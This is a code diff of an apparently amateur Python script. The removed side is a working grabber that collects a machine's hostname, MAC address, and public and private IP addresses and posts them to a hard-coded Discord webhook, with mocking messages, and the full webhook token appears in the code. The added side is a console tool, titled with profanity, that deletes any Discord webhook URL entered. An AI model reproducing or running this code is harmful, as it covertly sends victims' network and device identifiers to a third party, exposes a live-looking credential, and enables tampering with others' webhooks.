@@ -1,50 +1,24 @@
+from colorama import init, Fore, Back, Style
 import requests
-import json
-import socket
-import uuid
+import os
+import time
+import getpass
+username = getpass.getuser()
+init()
 
-# Replace this with the URL for your Discord webhook
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1087174333878780034/YoozAlgUB50HZ6X5iD5lJUnZjpvjqnVBYRqZ3Uz3Oy-P0tP0b_11WP_IxnvjzSXRuIyv'
-
-# Get the device name and MAC address
-device_name = socket.gethostname()
-device_type = ':'.join(format(x, '02x') for x in uuid.getnode().to_bytes(6, 'big'))
-
-# Get the public and private IP addresses
-ip = requests.get('https://api.ipify.org').text
-private_ip = socket.gethostbyname(socket.gethostname())
-
-# Define the data for the embed message
-data = {
-    'content': '',
-    'embeds': [
-        {
-            'title': '360 Noscoped!',
-            'description': 'Get rekt noob u trash',
-            'fields': [
-                {
-                    'name': 'IP Address',
-                    'value': f'Public IP: {ip}\nPrivate IP: {private_ip}',
-                    'inline': False
-                },
-                {
-                    'name': 'Device Info',
-                    'value': f'Device Name: {device_name}\nDevice Type: {device_type}',
-                    'inline': False
-                }
-            ],
-            'footer': {
-                'text': 'Get fucking beamed skid'
-            }
-        }
-    ]
-}
-
-# Send the message to the webhook
-response = requests.post(WEBHOOK_URL, data=json.dumps(data), headers={'Content-Type': 'application/json'})
-
-# Check the response status code
-if response.status_code == 204:
-    print('Message sent successfully!')
+print(Fore.GREEN + "[CONSOLE]: Discord Fucker Has Loaded!")
+time.sleep(.2)
+print(Fore.GREEN + "[CONSOLE]: Welcome, ", username,"!")
+time.sleep(.2)
+print(Fore.BLUE + "[CONSOLE]: Command Prompt Loaded")
+code_exe = input(">>>")
+if code_exe == "deletewebhook":
+    webhookdelete = input("Input Discord Webhook >>>")
+    webhook_url = webhookdelete
+    response = requests.delete(webhook_url)
+    if response.status_code == 204:
+        print("Webhook deleted successfully.")
 else:
-    print(f'Error sending message: {response.text}')
+    print("Error deleting webhook. Status code:", response.status_code)
+    
+
